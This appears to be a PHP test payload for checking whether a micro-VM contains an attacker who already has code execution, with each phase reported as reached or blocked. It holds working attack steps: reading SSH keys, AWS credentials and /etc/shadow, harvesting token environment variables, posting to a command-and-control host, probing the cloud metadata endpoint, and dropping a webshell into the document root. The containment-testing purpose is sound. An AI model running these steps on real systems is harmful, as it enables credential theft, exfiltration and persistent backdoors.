<?php
// The attacker's payload, run as if a PHP engine flaw in this class had
// already handed them code execution in the PHP process ("assume RCE").
// The same payload runs two ways: on a normal host (bare-metal/run.sh,
// where it succeeds) and inside an hluk micro-VM (the Justfile `run`
// target, where every phase is contained).  Each phase prints REACHED or
// blocked; the verdict at the end is what CI asserts.
//
// Nothing here is specific to any one CVE: it is the post-exploitation
// toolkit any RCE leads to — steal secrets, exfiltrate, pivot, persist.

$c2_host = getenv('C2_HOST') ?: '127.0.0.1';
$c2_port = (int) (getenv('C2_PORT') ?: 9000);
$reached = [];

function phase(string $name, bool $reached_it, string $detail): void
{
    global $reached;
    if ($reached_it) {
        $reached[] = $name;
        echo "[REACHED] $name: $detail\n";
    } else {
        echo "[blocked] $name: $detail\n";
    }
}

// 1. Read secrets that live outside anything the app was given: SSH keys,
//    cloud credentials, the shadow file.
$loot = [];
foreach ([getenv('HOME') . '/.ssh/id_rsa', getenv('HOME') . '/.aws/credentials', '/etc/shadow'] as $path) {
    $data = @file_get_contents($path);
    if ($data !== false && $data !== '') {
        $loot[$path] = strlen($data);
    }
}
phase('host secrets', $loot !== [],
    $loot ? 'read ' . implode(', ', array_keys($loot)) : 'no secret files readable');

// 2. Harvest secrets from the process environment.
$env_loot = array_filter(
    ['GITHUB_TOKEN' => getenv('GITHUB_TOKEN'), 'AWS_SECRET_ACCESS_KEY' => getenv('AWS_SECRET_ACCESS_KEY')],
    fn ($v) => $v !== false && $v !== ''
);
phase('environment secrets', $env_loot !== [],
    $env_loot ? 'harvested ' . implode(', ', array_keys($env_loot)) : 'no secrets in the environment');

// 3. Exfiltrate to a command-and-control host.
$exfil = @fsockopen($c2_host, $c2_port, $errno, $errstr, 3);
if ($exfil) {
    $body = json_encode(['secrets' => array_keys($loot), 'env' => array_keys($env_loot)]);
    fwrite($exfil, "POST /exfil HTTP/1.0\r\nHost: $c2_host\r\nContent-Length: " . strlen($body) . "\r\n\r\n$body");
    fclose($exfil);
}
phase('C2 exfiltration', $exfil !== false, $exfil ? "reached $c2_host:$c2_port" : "cannot reach $c2_host:$c2_port ($errstr)");

// 4. Pivot to the cloud metadata service for instance credentials.
//    Test TCP reachability, not an HTTP 200: a reachable IMDS answers a
//    plain GET with 401 (IMDSv2), which is still a reachable service — so
//    an HTTP rejection must not read as containment.
$meta = @fsockopen('169.254.169.254', 80, $m_errno, $m_errstr, 3);
if ($meta !== false) {
    fclose($meta);
}
phase('cloud metadata', $meta !== false,
    $meta !== false ? 'reached the metadata service at 169.254.169.254:80' : "cannot reach 169.254.169.254:80 ($m_errstr)");

// 5. Persist: drop a webshell into the document root for later.
$docroot = getenv('DOCROOT') ?: '/app';
$shell = $docroot . '/shell.php';
$dropped = @file_put_contents($shell, "<?php system(\$_GET['c']);\n") !== false;
phase('persistence', $dropped, $dropped ? "wrote a webshell to $shell" : "cannot write to the document root ($docroot)");

echo "\n";
if ($reached === []) {
    echo "Attack CONTAINED: every phase was blocked.\n";
} else {
    echo 'Attack SUCCEEDED: reached ' . implode(', ', $reached) . ".\n";
}
